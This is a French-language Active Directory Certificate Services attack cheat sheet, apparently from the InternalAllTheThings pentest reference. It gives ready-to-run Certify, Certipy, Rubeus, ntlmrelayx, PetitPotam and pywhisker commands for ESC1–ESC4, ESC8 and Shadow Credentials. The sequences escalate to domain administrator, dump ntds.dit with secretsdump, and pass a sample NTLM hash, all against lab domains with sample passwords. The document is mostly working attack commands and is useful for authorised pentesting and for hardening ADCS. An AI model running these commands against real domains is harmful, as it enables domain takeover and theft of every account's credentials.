https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/
# Énumération

## Network only
```bash
# ADCS expose des interfaces web par défaut
curl -k https://dc.domain.local/certsrv
nmap -p 443,80 --script http-title <dc_ip>
```

## Certify
```powershell
cd C:\Tools\Certify\Certify\bin\Release
.\Certify.exe enum-cas
.\Certify.exe enum-templates
.\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```
## Certipy
```bash
certipy find -u user@domain.local -p 'Password' -dc-ip 192.168.1.1
certipy find -u user@domain.local -p 'Password' -dc-ip 192.168.1.1 -vulnerable
```
## NetExec
```bash
netexec ldap domain.lab -u username -p password -M adcs
```
## ldapsearch
```bash
ldapsearch -H ldap://dc_IP -x -LLL -D 'user@domain.local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
```

# Certifpy output

| Champ                              | Description                                                                                                                                             |
| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Template Name`                    | Nom du template de certificat dans l'AD                                                                                                                 |
| `Enabled`                          | Indique si le template est actif et utilisable                                                                                                          |
| `Publishing CAs`                   | CA(s) qui publient ce template et acceptent les requêtes dessus                                                                                         |
| `Schema Version`                   | Version du schéma du template (1 = ancien, 2+ = supporte les extensions avancées)                                                                       |
| `Validity Period`                  | Durée de validité du certificat émis                                                                                                                    |
| `Renewal Period`                   | Période avant expiration pendant laquelle un renouvellement est possible                                                                                |
| `Certificate Name Flag`            | Contrôle qui définit le sujet du certificat. Vuln si `ENROLLEE_SUPPLIES_SUBJECT` (le demandeur choisit le SAN → ESC1)                                   |
| `Enrollment Flag`                  | Options supplémentaires appliquées lors de l'enrollment. Vuln si `CT_FLAG_NO_SECURITY_EXTENSION` (pas d'extension szOID → ESC9/ESC10)                   |
| `Manager Approval Required`        | Indique si un admin CA doit approuver manuellement chaque requête. Vuln si `False` (pas de contrôle humain)                                             |
| `Authorized Signatures Required`   | Nombre de signatures nécessaires pour soumettre une requête. Vuln si `0` (pas besoin d'enrollment agent)                                                |
| `Extended Key Usage`               | Usages autorisés. Vuln si `Client Authentication`, `Smart Card Logon`, `PKINIT Client Authentication`, `Any Purpose`, ou vide (aucun EKU = tout usage)  |
| `Certificate Application Policies` | Politiques d'application associées, souvent identiques à l'EKU sur les templates v2+. Mêmes valeurs vulnérables que l'EKU                               |
| `Vulnerabilities`                  | Classification automatique par Certify des vulnérabilités détectées sur ce template                                                                     |
| `Enrollment Rights`                | Groupes/utilisateurs autorisés à demander un certificat. Vuln si un groupe large type `Domain Users`, `Domain Computers`, `Authenticated Users`         |
| `Object Control Permissions`       | ACLs sur l'objet template dans l'AD. Vuln si `WriteDacl`, `WriteOwner`, `WriteProperty`, `GenericAll`, `GenericWrite` pour un groupe non-admin (→ ESC4) |

# ESC1

## Pré-requis

```
Enabled                               : True
Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
Manager Approval Required             : False
Authorized Signatures Required        : 0
Extended Key Usage                    : Client Authentication
Certificate Application Policies      : Client Authentication
Permissions
  Enrollment Permissions
	Enrollment Rights           : CONTOSO\Domain Users
```
## Certify
```powershell
.\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
```

```powershell
.\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
```
## Certipy
```bash
certipy req -u 'jaime.lannister'@sevenkingdoms.local -p 'pasdebraspasdechocolat' -target kingslanding.sevenkingdoms.local -template ESC1 -ca SEVENKINGDOMS-CA -upn administrator@sevenkingdoms.local
```

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```


# ESC2
```
Enabled                               : True
Manager Approval Required             : False
Authorized Signatures Required        : 0
Extended Key Usage                    : Any Purpose
Certificate Application Policies      : Any Purpose
Permissions
  Enrollment Permissions
	Enrollment Rights           : CONTOSO\Domain Users
```

- Si Certificate Name Flag: ENROLLEE_SUPPLIES_SUBJECT -> ESC1
- Si non -> ESC3

# ESC3
## Pré-requis
```
Enabled                               : True
Manager Approval Required             : False
Authorized Signatures Required        : 0
Extended Key Usage                    : Certificate Request Agent
Certificate Application Policies      : Certificate Request Agent
Permissions
  Enrollment Permissions
	Enrollment Rights           : CONTOSO\Domain Users
```
## Certify

First, request a certificate from this template using your current user context.
```powershell
.\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC3 --quiet
```

Then use that certificate to request another certificate on behalf of another user.  A template such as _User_ is a good candidate to use, because it has the Client Authentication EKU enabled.
```powershell
\Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx MIACAQ[...snip...]AAAAA= --quiet
```

## Certipy

Query cert
```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
```
Query cert with the Certificate Request Agent certificate we get before (-pfx)
```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
```
Auth
```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

# ESC4

## Pré-requis

```
Permissions
  Enrollment Permissions
	Enrollment Rights           : CONTOSO\Domain Users
  Object Control Permissions
	Write Owner                 : CONTOSO\Domain Users
	Write Dacl                  : CONTOSO\Domain Users
	Write Property              : CONTOSO\Domain Users
```
## Certify
Certify's `manage-template` command can abuse these permissions.  You can:
- Grant yourself enrollment rights using `--enroll <sid>` where `<sid>` is the SID of a principal (e.g. a domain user or group).
- Toggle manager approval (on or off) using `--manager-approval` and set the number of required authorised signatures `--authorized-signatures 0`.
- Toggle EKUs that allow client authentication using `--client-auth`, `--pkinit-auth` or `--smartcard-logon`.
- Toggle the **ENROLLEE_SUPPLIES_SUBJECT** flag using `--supply-subject`.

In this example, the _Client Authentication_ EKU is already enabled, so just add the **ENROLLEE_SUPPLIES_SUBJECT** flag and then mimic ESC1.

```powershell
.\Certify.exe manage-template --template ESC4 --supply-subject --quiet
```
## Certipy
Take the ESC4 template and change it to be vulnerable to ESC1 technique by using the genericWrite privilege we got. (we didn’t set the target here as we target the ldap)
```bash
certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug
```

Exploit ESC1 on the modified ESC4 template
```bash
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local
```

authentication with the pfx
```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

Rollback the template configuration
```bash
certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
```
# ESC8

Pré-requis :

* ADCS actif sur le domaine avec le web enrollment activé.
* Une méthode de coerce fonctionnelle (ici on utilise petitpotam non authentifié, mais un printerbug authentifié ou une autre méthode de coerce fonctionnera pareil)
* Il existe un template utile pour exploiter ESC8, par défaut sur un Active Directory il s'appelle _DomainController_

Vérifions que le web enrollment est actif à l'adresse : http://192.168.56.23/certsrv/certfnsh.asp

Ajouter un listener pour relayer l'authentification SMB vers HTTP avec impacket ntlmrelayx

```bash
ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Lancer le coerce avec petitpotam non authentifié (cela ne fonctionnera plus sur un Active Directory à jour, mais les autres méthodes de coerce authentifiées fonctionneront pareil). ntlmrelayx va relayer l'authentification vers le web enrollment et récupérer le certificat

```bash
python PetitPotam.py <LOCAL_IP> <SRV_IP_TO_COERCE>
```

Demander un TGT avec le certificat que l'on vient d'obtenir

```bash
python gettgtpkinit.py -cert-pfx MACHINE\$.pfx domain.com/machine$ 'machine.ccache'
```

On a maintenant un TGT pour meereen, on peut donc lancer un DCsync et récupérer tout le contenu de ntds.dit.

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/machine.ccache
nxc smb meereen.essos.local -k --use-kcache
nxc smb meereen.essos.local -k --use-kcache --ntds
secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
```

Se connecter avec pass-the-hash

```bash
nxc smb meereen.essos.local -u 'Administrateur' -H '4dcaa3baa4c8eddca29e2793490fc9b8'
```

# Shadow Credentials

![shadow_credentials](img/shadow_creds.png)

Le protocole d'authentification Kerberos fonctionne avec des tickets pour accorder l'accès. Un ST (Service Ticket) peut être obtenu en présentant un TGT (Ticket Granting Ticket). Ce TGT préalable ne peut être obtenu qu'en validant une première étape appelée « pré-authentification » (sauf si cette exigence est explicitement supprimée pour certains comptes, ce qui les rend vulnérables à l'[ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)). La pré-authentification peut être validée symétriquement (avec une clé DES, RC4, AES128 ou AES256) ou asymétriquement (avec des certificats). La méthode asymétrique de pré-authentification s'appelle PKINIT. Les objets utilisateur et ordinateur d'Active Directory possèdent un attribut nommé `msDS-KeyCredentialLink` où des clés publiques brutes peuvent être définies. Lors d'une tentative de pré-authentification via PKINIT, le KDC vérifie que l'utilisateur authentifiant possède la clé privée correspondante, et un TGT est envoyé en cas de correspondance. Il existe plusieurs scénarios où un attaquant peut contrôler un compte ayant la capacité de modifier l'attribut `msDS-KeyCredentialLink` (alias « kcl ») d'autres objets (ex. membre d'un [groupe spécial](https://www.thehacker.recipes/ad/movement/builtins/security-groups), possède des [ACE puissantes](https://www.thehacker.recipes/ad/movement/dacl/), etc.). Cela permet à un attaquant de créer une paire de clés, d'ajouter la clé publique brute dans l'attribut, et d'obtenir un accès persistant et furtif à l'objet cible (utilisateur ou ordinateur).

## NTLM Relay method

```bash
ntlmrelayx.py -t ldaps://192.168.56.12 --remove-mic -smb2support --shadow-credentials
```

```bash
python3 PetitPotam.py -u khal.drogo -p horse 192.168.56.129 braavos.essos.local
```

```bash
python3 gettgtpkinit.py -cert-pfx l4HvSu19.pfx -pfx-pass 0IHQeDUwBbshb0o0BOSy essos.local/BRAAVOS$ l4HvSu19.ccache
```

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/l4HvSu19.ccache
```

## ACL exploit method

```bash
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"
```

```bash
python3 gettgtpkinit.py -cert-pfx l4HvSu19.pfx -pfx-pass 0IHQeDUwBbshb0o0BOSy essos.local/BRAAVOS$ l4HvSu19.ccache
```

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/l4HvSu19.ccache
```
